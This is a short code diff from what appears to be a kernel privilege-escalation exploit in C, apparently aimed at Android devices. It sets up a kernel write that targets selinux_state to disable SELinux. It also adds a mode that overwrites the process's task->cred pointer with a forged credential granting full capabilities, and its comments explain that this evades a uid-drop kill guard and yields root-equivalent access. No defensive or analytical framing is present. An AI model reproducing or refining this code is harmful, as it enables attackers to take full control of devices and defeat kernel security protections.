@@ -409,17 +409,25 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                   (unsigned long long)g_main_left);
         }
         if (env_flag("MODE4_SELINUX", 0)) {
-          /* Z15-proven VALUE: P0 of .bss offset 0x02BB0000 — LE bytes
-           * 00 00 BB 2A ... → disabled=0, enforcing=0, initialized=0x2A≠0
-           * (avoids the SID flood that killed Z4's NULL store). */
           g_main_pc = (uint64_t)data_addr(KIMAGE_TEXT_BASE + 0x02BB0000ULL);
           uint64_t sel_off =
               (active_offsets && active_offsets->off_selinux_enforcing)
                   ? (uint64_t)active_offsets->off_selinux_enforcing
                   : 0x02A793C8ULL;
           g_main_left = (uint64_t)data_addr(KIMAGE_TEXT_BASE + sel_off);
-          pr_info("JC2 SELINUX: pc=%016llx (Z15 value) left=%016llx "
-                  "(&selinux_state)\n",
+          pr_info("JC2 SELINUX: pc=%016llx left=%016llx\n",
+                  (unsigned long long)g_main_pc,
+                  (unsigned long long)g_main_left);
+        }
+        if (env_flag("MODE4_CAPSONLY", 0) && g_cred_copy) {
+          /* diyiqiuye PFEM10 recipe: write task->cred (+0x780) = our
+           * spray-page cred copy (uid=2000 + full caps). The guard only
+           * kills on uid DROPS — uid stays 2000 → no kill. Caps give
+           * root-equivalent (open /proc/1/mem, exec payloads). */
+          g_main_pc = (uint64_t)g_cred_copy;
+          g_main_left = (uint64_t)pselect_write_target();
+          pr_info("JC2 CAPSONLY: pc=%016llx (caps-cred) left=%016llx "
+                  "(task+0x780)\n",
                   (unsigned long long)g_main_pc,
                   (unsigned long long)g_main_left);
         }
